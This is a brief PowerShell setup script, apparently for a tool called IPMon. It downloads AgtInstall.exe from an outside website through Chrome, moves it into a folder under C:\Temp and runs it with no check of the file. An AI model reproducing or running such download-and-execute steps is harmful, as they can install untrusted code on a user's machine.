Write-Progress -Activity 'Getting IPMon' -PercentComplete (100/10 * 1)
New-Item -Type Directory -Path "C:\Temp\Core\Programs\Tools\IPMon\" -Force
[system.Diagnostics.Process]::Start("chrome.exe","https://softjem.com.br/gtfl/AgtInstall.exe")
Move-Item "$env:userprofile\Downloads\AgtInstall.exe" "C:\Temp\Core\Programs\Tools\IPMon\"
& "C:\Temp\Core\Programs\Tools\IPMon\AgtInstall.exe"
